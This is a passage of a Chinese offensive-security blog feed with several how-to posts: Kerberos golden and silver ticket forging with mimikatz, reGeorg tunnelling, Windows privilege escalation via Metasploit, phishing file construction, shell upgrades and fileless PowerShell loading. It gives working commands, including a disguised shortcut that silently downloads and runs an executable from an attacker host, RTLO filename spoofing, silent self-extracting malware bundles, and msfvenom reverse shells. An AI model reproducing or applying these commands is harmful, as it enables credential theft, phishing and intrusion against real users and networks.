class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span>Exfiltration<span class="hljs-operator">/</span>Invoke-Mimikatz.<span class="hljs-params">ps1</span>&#x27;)</span>; Invoke-Mimikatz –DumpCerts<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hash</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>票据传递攻击</title>
    <link href="/2021/04/21/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/"/>
    <url>/2021/04/21/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="黄金票据攻击"><a href="#黄金票据攻击" class="headerlink" title="黄金票据攻击"></a>黄金票据攻击</h2><ol><li>   登陆域控，dump Krbtgt用户hash和域sid,<br>privilege::debug<br>lsadump::lsa /patch</li></ol><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ptt/ptt_01.png"></p><p>获取域信息</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ptt/ptt_02.png"></p><ol start="2"><li>   切换到普通域用户的机器，生成TGT凭证,用户名为administrator<br>mimi下执行kerberos::golden /user:administrator /domain:xxx.com /sid:xx-xx-xx-xx /krbtgt:Hash值 /ticket</li></ol><p>这里要注意sid不能带最后一个横杠之后的内容</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ptt/ptt_03.png"></p><ol start="3"><li><p>   然后使用mimikatz将凭证注入进去,攻击成功:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-comment"># kerberos::purge</span><br>mimikatz <span class="hljs-comment"># kerberos::ptt Administrator.kirbi</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ptt/ptt_04.png"></p></li><li><p> 使用psexec连接域控或其他域计算机</p></li></ol><p>\后面跟计算机名</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">psexec<span class="hljs-selector-class">.exe</span> \\DC<span class="hljs-selector-class">.next</span><span class="hljs-selector-class">.com</span> cmd<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ptt/ptt_07.png"></p><h2 id="白银票据攻击"><a href="#白银票据攻击" class="headerlink" title="白银票据攻击"></a>白银票据攻击</h2><ol><li>   首先登录域控，dump机器hash<br>privilege::debug<br>sekurlsa::logonpasswords</li></ol><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ptt/ptt_05.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ptt/ptt_06.png"></p><ol start="2"><li>   将hash保存下来，在普通域用户机器中进行ptt<br>mimi下执行kerberos::golden /domain:next.com /sid:xx-xx-xx-xx  /target:172.18.16.171 /rc4:NTML Hash  /service:cifs /user:user1 /ptt,这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统</li></ol><ol start="3"><li> 也可以使用psexec<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">psexec<span class="hljs-selector-class">.exe</span> \\DC<span class="hljs-selector-class">.next</span><span class="hljs-selector-class">.com</span> cmd<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>reGeorg内网穿透</title>
    <link href="/2021/04/15/reGeorg%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <url>/2021/04/15/reGeorg%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当遇到拿到webshell却无法取得主机权限的场景下，并不一定就要死磕提权这个思路或者放弃这个入口点，我们可以通过使用reGeorg搭建httptunnel代理直接深入内网。</p><h2 id="reGeorg安装使用"><a href="#reGeorg安装使用" class="headerlink" title="reGeorg安装使用"></a>reGeorg安装使用</h2><h3 id="原版reGeorg"><a href="#原版reGeorg" class="headerlink" title="原版reGeorg"></a>原版reGeorg</h3><p>项目地址：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/sensepost/</span>reGeorg.git<br>上传对应语言tunnel到网站可访问目录下如<br>python2 reGeorgSocksProxy.py -p <span class="hljs-number">8080</span> -u http:<span class="hljs-regexp">//</span>xxxx:<span class="hljs-number">8080</span><span class="hljs-regexp">/.tunnel/</span>tunnel.jsp<br></code></pre></td></tr></table></figure><h3 id="重构的Neo-reGeorg"><a href="#重构的Neo-reGeorg" class="headerlink" title="重构的Neo-reGeorg"></a>重构的Neo-reGeorg</h3><p>项目地址：<a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><p>普通使用</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs verilog">git clone https:<span class="hljs-comment">//github.com/L-codes/Neo-reGeorg.git</span><br>python neoreg<span class="hljs-variable">.py</span> <span class="hljs-keyword">generate</span> -k password<br>生成tunnel文件，将对应的tunnel上传到网站可访问目录下<br>python3 neoreg<span class="hljs-variable">.py</span> -k password -u http:<span class="hljs-comment">//xx/tunnel.php</span><br>默认会开启本地<span class="hljs-number">1080</span>端口socks5,-p参数可指定端口，-l参数可指定监听地址<br></code></pre></td></tr></table></figure><p>伪装404页面的服务端</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> neoreg.<span class="hljs-keyword">py</span> generate -<span class="hljs-keyword">k</span> <span class="hljs-symbol">&lt;you_password&gt;</span> --<span class="hljs-keyword">file</span> <span class="hljs-number">404</span>.html --httpcode <span class="hljs-number">404</span><br><span class="hljs-keyword">python</span> neoreg.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">k</span> <span class="hljs-symbol">&lt;you_password&gt;</span> -<span class="hljs-keyword">u</span> <span class="hljs-symbol">&lt;server_url&gt;</span> --skip<br></code></pre></td></tr></table></figure><h2 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h2><p>由于本篇内容过短顺便介绍下自己windows下常用的两种代理使用方式，分别是Chrome的插件SwitchyOmega和本地使用的Proxifier</p><h3 id="SwitchyOmega"><a href="#SwitchyOmega" class="headerlink" title="SwitchyOmega"></a>SwitchyOmega</h3><p>SwitchyOmega是Chrome的插件所以仅能用于web访问时使用代理，由于其方便的自动切换模式所以基本上我在访问对方内网web服务的时候会使用。</p><p>配置一个专用的情景模式代理通过reGeorg代理或其他访问内网的隧道</p><p>然后切换到常用的自动代理模式，访问目标的一些内网地址，如果访问不到就可以一键将这个ip/domain添加到这个代理中，非常方便也不影响其他网站的正常访问。</p><h3 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h3><p>在使用代理去访问目标内网的非web服务（如数据库等），或使用轻型工具通过代理扫描时，一般会使用Proxifier配置代理规则。</p><p>可以配置多个代理服务器，并对不同的软件、不同的ip范围分别指定代理规则。</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows提权速查流程</title>
    <link href="/2021/04/12/windows%E6%8F%90%E6%9D%83%E9%80%9F%E6%9F%A5%E6%B5%81%E7%A8%8B/"/>
    <url>/2021/04/12/windows%E6%8F%90%E6%9D%83%E9%80%9F%E6%9F%A5%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="1-可利用漏洞信息收集"><a href="#1-可利用漏洞信息收集" class="headerlink" title="1.可利用漏洞信息收集"></a>1.可利用漏洞信息收集</h2><p>收集本机systeminfo中补丁信息</p><p>在提权辅助平台 <a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a> 中查询可利用exp</p><p>然后查询exp，选择对应的Exp下载运行即可。<br><a href="https://i.hacking8.com/">https://i.hacking8.com/</a><br><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><p>提权Exp的运行方式，一般有以下几种：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">直接执行<span class="hljs-keyword">exe</span>程序，成功后会打开一个cmd窗口，在新窗口中权限就是<span class="hljs-built_in">system</span><br>在WebShell中执行<span class="hljs-keyword">exe</span>程序，执行方式为xxx.<span class="hljs-keyword">exe</span> whoami，成功后直接执行命令，再修改命令内容，可以执行不同的命令<br>利用MSF等工具<br>C++源码，Python脚本，PowerShell脚本等特殊方式<br></code></pre></td></tr></table></figure><h2 id="2-WinSystemHelper"><a href="#2-WinSystemHelper" class="headerlink" title="2.WinSystemHelper"></a>2.WinSystemHelper</h2><p>使用WinSystemHelper检查可利用的漏洞。该工具适合在任何Windows服务器上进行已知提权漏洞的检测</p><p><a href="https://github.com/brianwrf/WinSystemHelper">https://github.com/brianwrf/WinSystemHelper</a></p><p>上传WinSysHelper.bat、explt2003.txt、expgt2003.txt，运行bat查看结果</p><p>然后在可利用的Exp中任意下载一个并执行即可</p><h2 id="3-Sherlock"><a href="#3-Sherlock" class="headerlink" title="3.Sherlock"></a>3.Sherlock</h2><p>Sherlock是在Windows下用于本地提权的PowerShell脚本<br>分析漏洞出漏洞后利用对应Exp即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 启动Powershell</span><br><span class="hljs-variable">$</span> powershell.exe <span class="hljs-literal">-exec</span> bypass<br><br><span class="hljs-comment"># 本地加载脚本</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">Import-Module</span> Sherlock.ps1<br><br><span class="hljs-comment"># 远程加载脚本</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1&#x27;</span>)<br><br><span class="hljs-comment"># 检查漏洞，Vulnstatus为Appears Vulnerable即存在漏洞</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">Find-AllVulns</span><br></code></pre></td></tr></table></figure><h2 id="4-msf中的提权方法"><a href="#4-msf中的提权方法" class="headerlink" title="4.msf中的提权方法"></a>4.msf中的提权方法</h2><h3 id="getsystem"><a href="#getsystem" class="headerlink" title="getsystem"></a>getsystem</h3><p>meterpreter&gt; getsystem</p><h3 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/</span>local/bypassuac<br>use exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_injection<br>use windows<span class="hljs-regexp">/local/</span>bypassuac_vbs<br>use windows<span class="hljs-regexp">/local/</span>ask<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">meterpreter&gt;</span><span class="bash"> background  <span class="hljs-comment"># 后台session</span></span> <br><span class="hljs-meta">msf&gt;</span><span class="bash"> use exploit/windows/<span class="hljs-built_in">local</span>/bypassuac</span><br><span class="hljs-meta">msf&gt;</span><span class="bash"> <span class="hljs-built_in">set</span> SESSION &lt;session_id&gt;</span>  <br><span class="hljs-meta">#</span><span class="bash"> 后台session时会返回session_id,如不清楚可以使用命令sessions -l</span><br><span class="hljs-meta">msf&gt;</span><span class="bash"> run</span><br></code></pre></td></tr></table></figure><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 查询补丁</span><br>meterpreter&gt; <span class="hljs-builtin-name">run</span> post/windows/gather/enum_patches <br>[+] KB2999226 installed on 11/25/2020<br>[+] KB976902 installed on 11/21/2010<br><br><span class="hljs-comment"># 查询Exp</span><br>msf&gt; use post/multi/recon/local_exploit_suggester <br>msf&gt; <span class="hljs-builtin-name">set</span> LHOST &lt;攻击机IP&gt;<br>msf&gt; <span class="hljs-builtin-name">set</span> SESSION &lt;session_id&gt;<br>msf&gt; run<br><br><span class="hljs-comment"># 利用示例</span><br>msf&gt; use exploit/windows/local/cve_2019_1458_wizardopium <br>msf&gt; <span class="hljs-builtin-name">set</span> SESSION &lt;session_id&gt;<br>msf&gt; run<br>meterpreter&gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>提权</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见windows钓鱼文件制作</title>
    <link href="/2021/03/15/%E5%B8%B8%E8%A7%81windows%E9%92%93%E9%B1%BC%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C/"/>
    <url>/2021/03/15/%E5%B8%B8%E8%A7%81windows%E9%92%93%E9%B1%BC%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h2 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h2><p>1.ps1:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$WshShell</span> = New-Object -comObject WScript<span class="hljs-selector-class">.Shell</span>  <br><span class="hljs-variable">$Shortcut</span> = <span class="hljs-variable">$WshShell</span><span class="hljs-selector-class">.CreateShortcut</span>(<span class="hljs-string">&quot;test.lnk&quot;</span>)  <br><span class="hljs-variable">$Shortcut</span><span class="hljs-selector-class">.TargetPath</span> = <span class="hljs-string">&quot;%SystemRoot%\system32\cmd.exe&quot;</span>  <br><span class="hljs-variable">$Shortcut</span><span class="hljs-selector-class">.IconLocation</span> = <span class="hljs-string">&quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span>  <br><span class="hljs-variable">$Shortcut</span><span class="hljs-selector-class">.Arguments</span> = <span class="hljs-string">&quot;cmd /c powershell.exe -nop -w hidden -c IEX (new-object net.webclient).DownloadFile(&#x27;http://192.168.1.7:8000/ascotbe.exe&#x27;,&#x27;.\\ascotbe.exe&#x27;);&amp;cmd /c .\\ascotbe.exe&quot;</span><br><span class="hljs-variable">$Shortcut</span><span class="hljs-selector-class">.Save</span>()<br></code></pre></td></tr></table></figure><p>执行生成</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> -ExecutionPolicy RemoteSigned -file <span class="hljs-number">1</span>.ps<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="文件后缀RTLO"><a href="#文件后缀RTLO" class="headerlink" title="文件后缀RTLO"></a>文件后缀RTLO</h2><p>可生成视觉效果看起来后缀为正常的文件</p><p>原理是为了支持阿拉伯语，希伯来语等从右向左写的语言。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os  <br>os.rename(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test-\u202egnp.txt&#x27;</span>)<br><span class="hljs-keyword">import</span> os<br>os.rename(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>, <span class="hljs-string">u&#x27;no\u202eFDP.exe&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="CHM"><a href="#CHM" class="headerlink" title="CHM"></a>CHM</h2><p>cs</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">点击attacks——&gt;web Drive <span class="hljs-keyword">by</span>——&gt;scripted web Delivery<br></code></pre></td></tr></table></figure><p>msf</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/script/web_delivery <br><span class="hljs-builtin-name">set</span> target 2<br><span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> lport 4444<br><span class="hljs-builtin-name">set</span> lhost 192.168.10.128 #本机地址<br><span class="hljs-builtin-name">set</span> srvhost 0.0.0.0<br><span class="hljs-builtin-name">set</span> srvport 8080<br></code></pre></td></tr></table></figure><h2 id="自解压文件"><a href="#自解压文件" class="headerlink" title="自解压文件"></a>自解压文件</h2><p>准备两个文件，恶意文件和正规渠道下载的合法文件，同时添加到压缩文件，创建自解压格式压缩文件。</p><p>点击高级自解压选项</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">常规：<br>解压路径-&gt;绝对路径<br>C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<br>设置：<br>提取后运行<br>C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\恶</span>意软件名.exe<br>C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\合</span>法软件名.exe<br>模式：<br>安静模式-&gt;全部隐藏<br>更新：<br>更新方式-&gt;解压并更新文件<br>覆盖方式-&gt;覆盖所有文件<br></code></pre></td></tr></table></figure><p>点击确定生成xxx.exe格式的自解压文件。</p><p>然后使用ResourceHacker工具，打开原本合法文件.exe，将Icon Group文件保存为.ico</p><p>然后使用ResourceHacker打开生成的自解压文件，将Icon Group文件替换为新的文件，保存后修改刷新下文件名图标就修改过来了。</p><p>打开执行生成的捆绑文件（前提是里面的恶意文件本身免杀）360不报毒，然后用户看到的是正常合法文件的安装程序。</p><h2 id="office宏"><a href="#office宏" class="headerlink" title="office宏"></a>office宏</h2><p><a href="http://uuzdaisuki.com/2020/08/20/office%E5%AE%8F%E6%94%BB%E5%87%BB/">http://uuzdaisuki.com/2020/08/20/office%E5%AE%8F%E6%94%BB%E5%87%BB/</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.chabug.org/tools/2017.html">https://www.chabug.org/tools/2017.html</a></p>]]></content>
    
    
    <categories>
      
      <category>钓鱼</category>
      
    </categories>
    
    
    <tags>
      
      <tag>钓鱼</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf普通shell升级成meterpreter</title>
    <link href="/2021/03/12/msf%E6%99%AE%E9%80%9Ashell%E5%8D%87%E7%BA%A7%E6%88%90meterpreter/"/>
    <url>/2021/03/12/msf%E6%99%AE%E9%80%9Ashell%E5%8D%87%E7%BA%A7%E6%88%90meterpreter/</url>
    
    <content type="html"><![CDATA[<h2 id="升级shell"><a href="#升级shell" class="headerlink" title="升级shell"></a>升级shell</h2><p>接收普通反弹shell</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">use multi/<span class="hljs-keyword">handler</span><br><span class="hljs-keyword">set</span> payload windows/shell/reverse_tcp<br>run<br><br>[*] Started <span class="hljs-keyword">reverse</span> TCP <span class="hljs-keyword">handler</span> <span class="hljs-keyword">on</span> xxxxxxxx<br>[*] Encoded stage <span class="hljs-keyword">with</span> x86/shikata_ga_nai<br>[*] Sending encoded stage (<span class="hljs-number">267</span> bytes) <span class="hljs-keyword">to</span> xxxxxx<br>[*] Command shell <span class="hljs-keyword">session</span> <span class="hljs-number">3</span> opened (xxxxx -&gt; xxxxxxx) at <span class="hljs-number">2021</span><span class="hljs-number">-02</span><span class="hljs-number">-02</span> <span class="hljs-number">02</span>:<span class="hljs-number">43</span>:<span class="hljs-number">35</span> <span class="hljs-number">-0500</span><br></code></pre></td></tr></table></figure><p>接收成功之后将session放在后台</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">background<br></code></pre></td></tr></table></figure><p>1.一般方法<br>加载shell转换模块</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gams">use post/multi/manage/shell_to_meterpreter<br><span class="hljs-keyword">set</span> session <span class="hljs-comment">1</span><br>run<br><br><br>[*] Upgrading <span class="hljs-comment">session ID: 3</span><br>[*] Starting <span class="hljs-comment">exploit</span>/multi/<span class="hljs-comment">handler</span><br>[*] Started <span class="hljs-comment">reverse TCP handler on xxxxxx</span><br>[*] Post <span class="hljs-comment">module execution completed</span><br>msf6 <span class="hljs-comment">post(multi</span>/manage/<span class="hljs-comment">shell_to_meterpreter) &gt;</span><br>[*] Sending <span class="hljs-comment">stage (175174 bytes) to xxxxxx</span><br>[*] Meterpreter <span class="hljs-comment">session 4 opened (xxxxxx -&gt; xxxxxx) at 2021-02-02 02:45:02 -0500</span><br>[*] Stopping <span class="hljs-comment">exploit</span>/multi/<span class="hljs-comment">handler</span><br><br></code></pre></td></tr></table></figure><p>2.简单方法</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sessions</span> -u <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>查看新生成的session编号</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sessions -l</span><br></code></pre></td></tr></table></figure><p>进入新的meterpreter session</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">sessions -i 新的session编号<br><span class="hljs-string">[*]</span> Starting <span class="hljs-built_in">int</span>eraction with <span class="hljs-number">4.</span>..<br></code></pre></td></tr></table></figure><h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>在meterpreter中执行portfwd可进行端口转发</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">portfwd add -l <span class="hljs-number">1234</span> -r xx<span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">3389</span><br>-l 本地端口<br>-r 目标ip<br>-<span class="hljs-selector-tag">p</span> 目标端口<br></code></pre></td></tr></table></figure><h3 id="网络代理"><a href="#网络代理" class="headerlink" title="网络代理"></a>网络代理</h3><p>在msf中使用pivot可添加网络代理</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">route <span class="hljs-builtin-name">add</span> 内网ip 子网掩码 session的id<br>route print<br></code></pre></td></tr></table></figure><p>添加完成后可以在msf中访问目标网段，但是要使用其他程序来访问，需要额外搭建socks代理</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">三选一<br>use auxiliary<span class="hljs-regexp">/server/</span>socks4a<br>use auxiliary<span class="hljs-regexp">/server/</span>socks5<br>use auxiliary<span class="hljs-regexp">/server/</span>socks_unc<br>然后设置本地监听ip:port<br>set srvhost <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br>set srvport <span class="hljs-number">1080</span><br>run<br></code></pre></td></tr></table></figure><p>代理监听在0.0.0.0:1080端口</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/164525#h3-30">https://www.anquanke.com/post/id/164525#h3-30</a></p>]]></content>
    
    
    <categories>
      
      <category>msf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>powershell无文件</title>
    <link href="/2021/03/11/powershell%E6%97%A0%E6%96%87%E4%BB%B6/"/>
    <url>/2021/03/11/powershell%E6%97%A0%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="目标出网"><a href="#目标出网" class="headerlink" title="目标出网"></a>目标出网</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment"># 攻击机</span><br><span class="hljs-comment"># msf生成powershell脚本</span><br><span class="hljs-string">msfvenom</span> -<span class="hljs-string">p</span> <span class="hljs-string">windows</span>/<span class="hljs-string">x64</span>/<span class="hljs-string">meterpreter</span>/<span class="hljs-string">reverse_tcp</span> <span class="hljs-string">LHOST</span>=<span class="hljs-string">170</span>.<span class="hljs-string">170</span>.<span class="hljs-string">64</span>.<span class="hljs-string">17</span> <span class="hljs-string">LPORT</span>=<span class="hljs-string">4444</span> <span class="hljs-built_in">--arch</span> <span class="hljs-string">x64</span> <span class="hljs-built_in">--platform</span> <span class="hljs-string">windows</span> -<span class="hljs-string">f</span> <span class="hljs-string">psh-reflection</span> -<span class="hljs-string">o</span> <span class="hljs-string">test</span>.<span class="hljs-string">ps1</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><span class="hljs-comment"># python监听http</span><br><span class="hljs-string">python</span> -<span class="hljs-string">m</span> <span class="hljs-string">SimpleHTTPServer</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><span class="hljs-comment"># msf监听</span><br><span class="hljs-string">use</span> <span class="hljs-string">multi</span>/<span class="hljs-string">handler</span><br><span class="hljs-string">set</span> <span class="hljs-string">payload</span> <span class="hljs-string">windows</span>/<span class="hljs-string">x64</span>/<span class="hljs-string">shell</span>/<span class="hljs-string">reverse_tcp</span><br><span class="hljs-string">set</span> <span class="hljs-string">lhost</span> <span class="hljs-string">170</span>.<span class="hljs-string">170</span>.<span class="hljs-string">64</span>.<span class="hljs-string">17</span><br><span class="hljs-string">run</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><span class="hljs-comment"># 受害机执行</span><br><span class="hljs-string">powershell</span> <span class="hljs-string">Invoke-Expression</span>(<span class="hljs-string">New-Object</span> <span 